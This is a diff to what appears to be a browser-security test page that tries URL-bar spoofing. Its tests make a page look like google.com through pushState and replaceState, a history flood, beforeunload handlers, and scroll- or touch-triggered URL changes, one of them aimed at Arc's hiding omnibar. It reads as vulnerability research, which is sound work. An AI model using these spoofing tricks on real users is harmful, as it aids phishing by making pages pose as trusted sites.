@@ -291,32 +291,70 @@ function testB3() {
 
 // C1: pushState + back
 function testC1() {
-    // Push a google.com-like URL to history
-    history.pushState({}, 'Google', '/search?q=test');
-    // Trigger back
-    setTimeout(() => history.back(), 50);
+    let w = window.open('about:blank', '_blank');
+    try {
+        w.document.open();
+        w.document.write(`<html><body style="font-family:arial;padding:20px;">
+        <h1>Testing pushState + back</h1>
+        <p>Pushing google.com-like URL, then going back...</p>
+        <script>
+            // Push a google.com path
+            history.pushState({}, 'Google', '/search?q=test');
+            document.title = 'Google';
+            // Trigger back after delay
+            setTimeout(() => history.back(), 500);
+        <\/script>
+        </body></html>`);
+        w.document.close();
+    } catch(e) {}
 }
 
 // C2: History flood
 function testC2() {
-    for (let i = 0; i < 100; i++) {
-        history.pushState({i: i}, '', '/page' + i);
-    }
-    // Now navigate to google
-    setTimeout(() => {
-        window.location.href = TARGET;
-    }, 100);
+    let w = window.open('about:blank', '_blank');
+    try {
+        w.document.open();
+        w.document.write(`<html><body style="font-family:arial;padding:20px;">
+        <h1>History flood attack</h1>
+        <p>Flooding history with 100 entries, then navigating...</p>
+        <script>
+            // Flood history
+            for (let i = 0; i < 100; i++) {
+                history.pushState({i: i}, '', '/page' + i);
+            }
+            // Now navigate to google
+            setTimeout(() => {
+                window.location.href = '${TARGET}';
+            }, 500);
+        <\/script>
+        </body></html>`);
+        w.document.close();
+    } catch(e) {}
 }
 
 // C3: replaceState during navigation
 function testC3() {
-    window.addEventListener('beforeunload', () => {
-        try {
-            history.replaceState({}, 'Spoofed', 'https://www.google.com/spoofed');
-        } catch(e) {}
-    });
-    // Navigate to a different page
-    window.location.href = 'about:blank';
+    let w = window.open('about:blank', '_blank');
+    try {
+        w.document.open();
+        w.document.write(`<html><body style="font-family:arial;padding:20px;">
+        <h1>replaceState during transition</h1>
+        <p>Will replaceState during navigation beforeunload...</p>
+        <script>
+            window.addEventListener('beforeunload', () => {
+                try {
+                    // Can only replaceState to same-origin paths
+                    history.replaceState({}, 'Google Search', '/search?q=spoofed');
+                } catch(e) {}
+            });
+            // Navigate away after 1 second
+            setTimeout(() => {
+                window.location.href = '${TARGET}';
+            }, 1000);
+        <\/script>
+        </body></html>`);
+        w.document.close();
+    } catch(e) {}
 }
 
 // D1: Named window race
@@ -425,9 +463,11 @@ function testG1() {
                 if (window.scrollY > 500 && !triggered) {
                     triggered = true;
                     // Navigate while omnibar is hidden (Arc hides on scroll down)
-                    history.pushState({}, 'Google', 'https://www.google.com/');
+                    // Use relative path to avoid cross-origin error
+                    history.pushState({}, 'Google', '/search?q=omnibar+spoof');
+                    document.title = 'Google';
                     document.getElementById('status').textContent = 'TRIGGERED - check omnibar!';
-                    document.body.innerHTML = '<div style="padding:40px"><h1 style="color:red">SPOOFED</h1><p>Omnibar should show google.com while scrolled</p></div>';
+                    document.body.innerHTML = '<div style="padding:40px"><h1 style="color:red">SPOOFED</h1><p>Omnibar should show /search?q=omnibar+spoof while scrolled</p></div>';
                 }
             });
         <\/script>
@@ -450,7 +490,8 @@ function testG2() {
             window.addEventListener('beforeunload', function() {
                 if (!refreshing) {
                     refreshing = true;
-                    history.replaceState({}, 'Google', 'https://www.google.com/');
+                    history.replaceState({}, 'Google', '/search?q=refresh');
+                    document.title = 'Google';
                 }
             });
 
@@ -482,14 +523,14 @@ function testG3() {
         w.document.open();
         w.document.write(`<html><body style="font-family:arial;padding:20px;">
         <h1>Tap anywhere on this page</h1>
-        <p>On touch, pushState changes URL to google.com.</p>
+        <p>On touch, pushState changes URL to google.com-like path.</p>
         <div id="status" style="margin-top:20px;padding:12px;background:#f0f0f0;border-radius:8px;"></div>
         <script>
             document.addEventListener('touchstart', function(e) {
                 try {
-                    history.pushState({}, 'Google', 'https://www.google.com/search?q=test');
-                    document.getElementById('status').innerHTML = '<b style="color:red">pushState fired!</b> Check omnibar.';
+                    history.pushState({}, 'Google', '/search?q=test');
                     document.title = 'Google';
+                    document.getElementById('status').innerHTML = '<b style="color:red">pushState fired!</b> Check omnibar.';
                 } catch(err) {
                     document.getElementById('status').innerHTML = 'pushState failed: ' + err.message;
                     // Fallback: try replaceState
